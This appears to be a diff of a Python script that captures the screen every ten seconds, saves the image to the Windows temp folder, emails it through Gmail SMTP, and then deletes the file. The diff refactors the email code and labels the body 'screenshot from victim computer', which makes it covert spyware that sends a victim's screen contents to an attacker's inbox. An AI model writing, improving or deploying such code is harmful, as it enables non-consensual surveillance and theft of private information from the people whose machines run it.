@@ -1,9 +1,8 @@
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.image import MIMEImage
+from email.message import EmailMessage
 import ssl
 import smtplib
 import pyautogui
+from PIL import Image
 import os
 from pathlib import Path
 import time
@@ -14,7 +13,7 @@ def take_screenshot():
     # Find path to home directory
     home_dir = Path.home()
     # Join home directory with folder name
-    path = os.path.join(home_dir, "Documents")
+    path = os.path.join(home_dir, "AppData/Local/Temp")
     
     # Take screenshot
     screenshot = pyautogui.screenshot()
@@ -22,44 +21,42 @@ def take_screenshot():
     image_full_path = path + '\\' + "screenshot.jpg"
 
 
-
 def send_email():
+
+    take_screenshot()
            
-    email_sender = " "
-    email_password = " "
-    email_receiver = " "
+    email_sender = ""
+    email_password = ""
+    email_receiver = ""
 
-    subject = "Test"
-    body = "Screenshot"
+    subject = "Test 1"
+    body = "screenshot from victim computer"
 
-    em = MIMEMultipart()
-    em['From'] = email_sender
-    em['To'] = email_receiver
-    em['subject'] = subject
+    msg = EmailMessage()
+    msg['From'] = email_sender
+    msg['To'] = email_receiver
+    msg['subject'] = subject
 
-    em.attach(MIMEText(body, 'plain'))
+    msg.set_content(body)
 
-    file_location = image_full_path
-    file_name = os.path.basename(file_location)
-    attachment = open(file_location, "rb").read()
+    img = Image.open(image_full_path)
+    with open(image_full_path, "rb") as f:
+        img_data = f.read()
+        img_type = img.format
+        img_name = f.name
 
-    image = MIMEImage(attachment, file_name)
-    em.attach(image)
-   
+    msg.add_attachment(img_data, maintype='image', subtype=img_type, filename=img_name)
 
     context = ssl.create_default_context()
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
         smtp.login(email_sender, email_password)
-        smtp.sendmail(email_sender, email_receiver, em.as_string())
+        smtp.send_message(msg)
 
 
 
 while True:
     time.sleep(10)
-    take_screenshot()
     send_email()
 
     os.remove(image_full_path)
-
-
